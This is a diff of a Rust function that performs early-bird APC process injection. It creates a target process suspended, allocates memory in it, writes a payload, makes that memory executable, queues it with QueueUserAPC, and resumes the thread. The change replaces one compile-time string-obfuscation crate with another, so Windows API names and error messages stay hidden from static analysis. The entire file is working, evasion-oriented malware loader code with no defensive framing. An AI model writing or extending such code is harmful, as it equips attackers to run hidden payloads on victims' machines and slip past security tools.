@@ -1,19 +1,19 @@
 pub unsafe fn exec(p: usize, size: usize, target_program: &str) -> Result<(), String> {
     use std::ffi::c_void;
     use crate::utils::{load_library, get_proc_address};
-    use rustcrypt_ct_macros::{obf_lit_bytes, obf_lit};
+use obfstr::{obfbytes, obfstr};
     use std::ptr::{null, null_mut};
     use std::mem::transmute;
     use windows_sys::Win32::System::Threading::{PROCESS_INFORMATION, STARTUPINFOW, CREATE_SUSPENDED};
     use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
     
-    let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;
-    let p_virtual_alloc_ex = get_proc_address(kernel32, obf_lit_bytes!(b"VirtualAllocEx\0").as_slice())?;
-    let p_virtual_protect_ex = get_proc_address(kernel32, obf_lit_bytes!(b"VirtualProtectEx\0").as_slice())?;
-    let p_write_process_memory = get_proc_address(kernel32, obf_lit_bytes!(b"WriteProcessMemory\0").as_slice())?;
-    let p_queue_user_apc = get_proc_address(kernel32, obf_lit_bytes!(b"QueueUserAPC\0").as_slice())?;
-    let p_create_process_w = get_proc_address(kernel32, obf_lit_bytes!(b"CreateProcessW\0").as_slice())?;
-    let p_resume_thread = get_proc_address(kernel32, obf_lit_bytes!(b"ResumeThread\0").as_slice())?;
+    let kernel32 = load_library(obfbytes!(b"kernel32.dll\0").as_slice())?;
+    let p_virtual_alloc_ex = get_proc_address(kernel32, obfbytes!(b"VirtualAllocEx\0").as_slice())?;
+    let p_virtual_protect_ex = get_proc_address(kernel32, obfbytes!(b"VirtualProtectEx\0").as_slice())?;
+    let p_write_process_memory = get_proc_address(kernel32, obfbytes!(b"WriteProcessMemory\0").as_slice())?;
+    let p_queue_user_apc = get_proc_address(kernel32, obfbytes!(b"QueueUserAPC\0").as_slice())?;
+    let p_create_process_w = get_proc_address(kernel32, obfbytes!(b"CreateProcessW\0").as_slice())?;
+    let p_resume_thread = get_proc_address(kernel32, obfbytes!(b"ResumeThread\0").as_slice())?;
 
     type VirtualAllocExFn = unsafe extern "system" fn(*mut c_void, *const c_void, usize, u32, u32) -> *mut c_void;
     type VirtualProtectExFn = unsafe extern "system" fn(*mut c_void, *const c_void, usize, u32, *mut u32) -> i32;
@@ -40,7 +40,7 @@ pub unsafe fn exec(p: usize, size: usize, target_program: &str) -> Result<(), St
     let create_process_w: CreateProcessWFn = transmute(p_create_process_w);
     let resume_thread: ResumeThreadFn = transmute(p_resume_thread);
 
-    let p_close_handle = get_proc_address(kernel32, obf_lit_bytes!(b"CloseHandle\0").as_slice())?;
+    let p_close_handle = get_proc_address(kernel32, obfbytes!(b"CloseHandle\0").as_slice())?;
     type CloseHandleFn = unsafe extern "system" fn(isize) -> i32;
     let close_handle: CloseHandleFn = transmute(p_close_handle);
 
@@ -68,7 +68,7 @@ pub unsafe fn exec(p: usize, size: usize, target_program: &str) -> Result<(), St
         &mut proc_info,
     );
     if ret == 0 {
-        return Err(obf_lit!("CreateProcessW failed").to_string());
+        return Err(obfstr!("CreateProcessW failed").to_string());
     }
 
     let addr = virtual_alloc_ex(
@@ -81,7 +81,7 @@ pub unsafe fn exec(p: usize, size: usize, target_program: &str) -> Result<(), St
     if addr.is_null() {
         close_handle(proc_info.hProcess);
         close_handle(proc_info.hThread);
-        return Err(obf_lit!("VirtualAllocEx failed").to_string());
+        return Err(obfstr!("VirtualAllocEx failed").to_string());
     }
 
     let mut written = 0;
@@ -95,7 +95,7 @@ pub unsafe fn exec(p: usize, size: usize, target_program: &str) -> Result<(), St
     if ret_write == 0 {
         close_handle(proc_info.hProcess);
         close_handle(proc_info.hThread);
-        return Err(obf_lit!("WriteProcessMemory failed").to_string());
+        return Err(obfstr!("WriteProcessMemory failed").to_string());
     }
 
     let mut old_protect = PAGE_READWRITE;
@@ -109,7 +109,7 @@ pub unsafe fn exec(p: usize, size: usize, target_program: &str) -> Result<(), St
     if ret_protect == 0 {
         close_handle(proc_info.hProcess);
         close_handle(proc_info.hThread);
-        return Err(obf_lit!("VirtualProtectEx failed").to_string());
+        return Err(obfstr!("VirtualProtectEx failed").to_string());
     }
 
     let apc_fn: unsafe extern "system" fn(usize) = transmute(addr);
@@ -117,14 +117,14 @@ pub unsafe fn exec(p: usize, size: usize, target_program: &str) -> Result<(), St
     if ret_apc == 0 {
         close_handle(proc_info.hProcess);
         close_handle(proc_info.hThread);
-        return Err(obf_lit!("QueueUserAPC failed").to_string());
+        return Err(obfstr!("QueueUserAPC failed").to_string());
     }
 
     let ret_resume = resume_thread(proc_info.hThread as *mut c_void);
     if ret_resume == 0xFFFFFFFF {
         close_handle(proc_info.hProcess);
         close_handle(proc_info.hThread);
-        return Err(obf_lit!("ResumeThread failed").to_string());
+        return Err(obfstr!("ResumeThread failed").to_string());
     }
 
     close_handle(proc_info.hProcess);
